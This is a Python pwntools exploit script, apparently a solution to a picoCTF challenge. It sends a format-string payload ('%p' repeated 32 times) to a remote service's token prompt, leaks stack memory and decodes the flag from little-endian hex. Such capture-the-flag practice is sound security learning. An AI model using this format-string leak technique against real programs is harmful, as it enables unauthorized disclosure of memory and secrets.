#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 16439 vuln
from pwn import *
import struct

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 16439)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.sendlineafter('2) View my portfolio\n', "1")
io.sendlineafter('What is your API token?\n', '%p'*32)
io.recvline()
output = io.recvline()
hex_bytes = str(output)[4:].split("0x")
# Get the index of the position in the dumped stack of the word "pico".
# The program uses little endian, so "pico" is backwards.
flag_start_index = hex_bytes.index("6f636970")
str_output = ""
for x in hex_bytes[flag_start_index:]:
    try:
        little_hex = bytearray.fromhex(x)
    except ValueError:
        # Ignore values that cannot be converted from hex
        pass
    # Reverse because values are stored using little endian.
    little_hex.reverse()
    # Convert the hex to ascii. Convert each letter to ascii using `chr` if
    # it is between `0` and `}` in ascii, otherwise skip it. This line is
    # based on https://stackoverflow.com/a/20078869.
    str_output += "".join([chr(i) if ord("0") <= i <= ord("}") else "" for i in little_hex])

# The flag stops at the first `}`
flag = str_output.split("}")[0] + "}"
print("Flag: %s" % flag)
Â© 2022 GitHub, Inc.
Terms
Privacy
Security
Status
